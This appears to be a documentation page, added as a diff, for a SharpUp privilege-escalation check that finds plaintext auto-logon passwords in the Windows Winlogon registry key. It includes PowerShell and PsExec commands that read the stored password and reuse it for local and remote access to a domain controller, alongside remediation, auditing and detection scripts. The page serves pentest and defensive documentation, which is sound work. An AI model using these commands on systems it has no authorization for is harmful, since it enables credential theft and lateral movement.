@@ -1,0 +1,327 @@
+---
+title: 'Registry AutoLogons'
+description: 'Plaintext credentials in auto-logon registry keys'
+icon: 'key'
+---
+
+## Overview
+
+The Registry AutoLogons check searches for plaintext credentials stored in the Windows registry for automatic logon functionality. When auto-logon is configured, Windows stores the username and password in plaintext in the registry, accessible to any user who can read the registry.
+
+<Warning>
+These credentials are stored in PLAINTEXT and readable by all users on the system.
+</Warning>
+
+## How It Works
+
+SharpUp checks the Winlogon registry key for auto-logon configuration:
+
+```
+HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
+```
+
+**Registry Values Checked:**
+- `AutoAdminLogon` - Must be set to "1"
+- `DefaultUserName` - Username for auto-logon
+- `DefaultPassword` - Plaintext password
+- `DefaultDomainName` - Domain name
+- `AltDefaultUserName` - Alternative username
+- `AltDefaultPassword` - Alternative password
+- `AltDefaultDomainName` - Alternative domain
+
+## Example Output
+
+```
+Registry AutoLogon Found
+
+=== Registry AutoLogons ===
+    DefaultDomainName: CONTOSO
+    DefaultUserName: Administrator
+    DefaultPassword: P@ssw0rd123!
+    AltDefaultDomainName:
+    AltDefaultUserName:
+    AltDefaultPassword:
+```
+
+**Interpretation:**
+- Auto-logon is enabled
+- Administrator account credentials are stored in plaintext
+- Domain is CONTOSO
+- These credentials can be used immediately for privilege escalation
+
+## Exploitation
+
+### Method 1: Direct Credential Read
+
+```powershell
+# Read credentials from registry
+$winlogon = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
+
+$autoLogon = Get-ItemProperty -Path $winlogon -Name "AutoAdminLogon" -ErrorAction SilentlyContinue
+$username = Get-ItemProperty -Path $winlogon -Name "DefaultUserName" -ErrorAction SilentlyContinue
+$password = Get-ItemProperty -Path $winlogon -Name "DefaultPassword" -ErrorAction SilentlyContinue
+$domain = Get-ItemProperty -Path $winlogon -Name "DefaultDomainName" -ErrorAction SilentlyContinue
+
+if ($autoLogon.AutoAdminLogon -eq "1") {
+    Write-Host "[+] Auto-Logon Enabled"
+    Write-Host "    Domain: $($domain.DefaultDomainName)"
+    Write-Host "    Username: $($username.DefaultUserName)"
+    Write-Host "    Password: $($password.DefaultPassword)"
+}
+```
+
+### Method 2: Use Credentials with RunAs
+
+```powershell
+# Use discovered credentials
+$username = "CONTOSO\Administrator"
+$password = "P@ssw0rd123!" | ConvertTo-SecureString -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential($username, $password)
+
+# Execute command as that user
+Start-Process powershell.exe -Credential $cred -ArgumentList "-NoExit","-Command","whoami"
+```
+
+### Method 3: PSExec with Credentials
+
+```cmd
+# Use discovered credentials with PSExec
+psexec.exe \\localhost -u CONTOSO\Administrator -p P@ssw0rd123! cmd.exe
+```
+
+### Method 4: Remote Authentication
+
+```powershell
+# Use credentials to authenticate to other systems
+$pass = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential("CONTOSO\Administrator", $pass)
+
+# Access remote system
+Enter-PSSession -ComputerName DC01 -Credential $cred
+
+# Or invoke commands
+Invoke-Command -ComputerName DC01 -Credential $cred -ScriptBlock { whoami; ipconfig }
+```
+
+## Remediation
+
+<Steps>
+  <Step title="Disable Auto-Logon">
+    ```powershell
+    # Disable auto-logon
+    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" `
+        -Name "AutoAdminLogon" `
+        -Value "0"
+
+    # Remove stored password
+    Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" `
+        -Name "DefaultPassword" `
+        -ErrorAction SilentlyContinue
+
+    Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" `
+        -Name "AltDefaultPassword" `
+        -ErrorAction SilentlyContinue
+
+    Write-Host "[+] Auto-logon disabled and passwords removed"
+    ```
+  </Step>
+
+  <Step title="Change Exposed Password">
+    ```powershell
+    # Change password for the exposed account
+    net user Administrator "NewComplexP@ssw0rd123!"
+
+    # Or for domain account
+    Set-ADAccountPassword -Identity Administrator -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "NewP@ssw0rd!" -Force)
+    ```
+  </Step>
+
+  <Step title="Use Alternative Auto-Logon Solutions">
+    If auto-logon is required:
+
+    - **Autologon.exe from Sysinternals** - Encrypts credentials using LSA secrets
+    - **Windows Credential Manager** - More secure credential storage
+    - **Smart Card authentication** - Hardware-based authentication
+    - **Windows Hello** - Biometric authentication
+  </Step>
+
+  <Step title="Verify Removal">
+    ```bash
+    # Re-run check
+    SharpUp.exe RegistryAutoLogons
+    ```
+
+    Should return no results.
+  </Step>
+</Steps>
+
+## Detection
+
+### Defensive Monitoring
+
+```powershell
+# Monitor registry changes to Winlogon
+$registryPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
+
+# Enable auditing
+$acl = Get-Acl $registryPath
+$auditRule = New-Object System.Security.AccessControl.RegistryAuditRule(
+    "Everyone",
+    "SetValue",
+    "None",
+    "None",
+    "Success"
+)
+$acl.AddAuditRule($auditRule)
+Set-Acl $registryPath $acl
+
+# Monitor Event ID 4657 for registry modifications
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4657} |
+Where-Object {$_.Message -match 'Winlogon.*DefaultPassword'}
+```
+
+### Detection Strategies
+
+<Tabs>
+  <Tab title="Registry Monitoring">
+    - Monitor Winlogon registry key for changes
+    - Alert when AutoAdminLogon is set to 1
+    - Detect DefaultPassword value creation
+    - Track who reads these registry values
+  </Tab>
+
+  <Tab title="Credential Usage">
+    - Monitor authentication attempts with auto-logon account
+    - Alert on unusual logon patterns
+    - Detect lateral movement using these credentials
+    - Track privilege escalation after credential discovery
+  </Tab>
+
+  <Tab title="Configuration Auditing">
+    - Regularly scan for auto-logon configurations
+    - Alert security team when found
+    - Automate remediation when possible
+  </Tab>
+</Tabs>
+
+## Real-World Scenarios
+
+<AccordionGroup>
+  <Accordion title="Scenario 1: Kiosk System">
+    **Context:** Public kiosk system configured with auto-logon for convenience. Administrator credentials used.
+
+    **Risk:**
+    - Anyone can read registry and obtain administrator password
+    - Password likely reused across all kiosks
+    - Complete compromise of kiosk infrastructure
+
+    **Solution:**
+    - Use dedicated kiosk account with minimal privileges
+    - Enable Assigned Access (kiosk mode)
+    - Don't use administrator accounts
+    - Rotate credentials regularly
+  </Accordion>
+
+  <Accordion title="Scenario 2: Server Auto-Restart">
+    **Context:** Server configured to auto-logon after reboot to start applications automatically.
+
+    **Impact:**
+    - Service account credentials in plaintext
+    - Credentials may have broad access
+    - Enables lateral movement
+
+    **Solution:**
+    - Use Windows Services instead of interactive logon
+    - Implement gMSA or sMSA
+    - Use scheduled tasks with proper credential storage
+  </Accordion>
+
+  <Accordion title="Scenario 3: Penetration Test">
+    **Context:** Gained access as low-privileged user on workstation.
+
+    **Attack Path:**
+    1. Run SharpUp to discover auto-logon credentials
+    2. Find Domain Admin credentials in registry
+    3. Use credentials to access domain controller
+    4. Complete domain compromise
+  </Accordion>
+</AccordionGroup>
+
+## Prevention Best Practices
+
+<CardGroup cols={2}>
+  <Card title="Never Use Auto-Logon" icon="ban">
+    Avoid auto-logon in enterprise environments. It's inherently insecure.
+  </Card>
+  <Card title="Minimal Privilege Accounts" icon="user-shield">
+    If auto-logon is necessary, use accounts with minimal privileges.
+  </Card>
+  <Card title="Use Services" icon="gear">
+    Use Windows Services or Scheduled Tasks instead of interactive logon.
+  </Card>
+  <Card title="Regular Audits" icon="magnifying-glass">
+    Regularly scan for auto-logon configurations across all systems.
+  </Card>
+</CardGroup>
+
+### Automated Detection Script
+
+```powershell
+# Scan all computers in domain for auto-logon
+$computers = Get-ADComputer -Filter * | Select-Object -ExpandProperty Name
+
+$results = foreach ($computer in $computers) {
+    try {
+        $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $computer)
+        $key = $reg.OpenSubKey("Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
+
+        $autoLogon = $key.GetValue("AutoAdminLogon")
+
+        if ($autoLogon -eq "1") {
+            [PSCustomObject]@{
+                ComputerName = $computer
+                AutoLogon = $autoLogon
+                Username = $key.GetValue("DefaultUserName")
+                Domain = $key.GetValue("DefaultDomainName")
+                PasswordStored = ($key.GetValue("DefaultPassword") -ne $null)
+            }
+        }
+    }
+    catch {
+        Write-Warning "Cannot access $computer"
+    }
+}
+
+if ($results) {
+    $results | Export-Csv "AutoLogonSystems_$(Get-Date -Format yyyyMMdd).csv" -NoTypeInformation
+    Send-MailMessage -To "security@company.com" -Subject "Auto-Logon Systems Found" -Body "See attached" -Attachments "AutoLogonSystems_$(Get-Date -Format yyyyMMdd).csv"
+}
+```
+
+## Related Checks
+
+<CardGroup cols={2}>
+  <Card title="Cached GPP Password" icon="folder" href="/ghostpack-docs/SharpUp-mdx/checks/cachedgpppassword">
+    Cached Group Policy Preference passwords
+  </Card>
+  <Card title="Unattended Install Files" icon="file" href="/ghostpack-docs/SharpUp-mdx/checks/unattendedinstallfiles">
+    Credentials in unattended installation files
+  </Card>
+  <Card title="Domain GPP Password" icon="server" href="/ghostpack-docs/SharpUp-mdx/checks/domaingpppassword">
+    GPP passwords in SYSVOL
+  </Card>
+  <Card title="Remediation Guide" icon="shield" href="/ghostpack-docs/SharpUp-mdx/remediation">
+    Comprehensive remediation guidance
+  </Card>
+</CardGroup>
+
+## References
+
+<CardGroup cols={2}>
+  <Card title="Microsoft Docs" icon="book" href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon">
+    Turn on automatic logon in Windows
+  </Card>
+  <Card title="MITRE ATT&CK" icon="book" href="https://attack.mitre.org/techniques/T1552/002/">
+    T1552.002 - Unsecured Credentials: Credentials in Registry
+  </Card>
+</CardGroup>
